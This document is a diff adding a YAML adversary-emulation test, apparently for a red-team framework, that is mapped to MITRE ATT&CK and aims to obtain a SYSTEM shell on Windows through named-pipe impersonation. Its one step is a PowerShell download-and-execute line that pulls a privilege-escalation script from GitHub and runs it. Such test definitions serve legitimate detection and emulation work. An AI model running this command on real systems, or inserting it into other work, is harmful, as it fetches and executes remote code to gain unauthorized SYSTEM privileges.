@@ -1,0 +1,19 @@
+api_version: "2.0"
+name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
+description: Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn
+uuid: e1f93a06-1649-4f07-89a8-f57279a7d60e
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1106: Native API'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---get-system-shell---pop-system-shell-using-namedpipe-impersonation-technique
+      inline: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
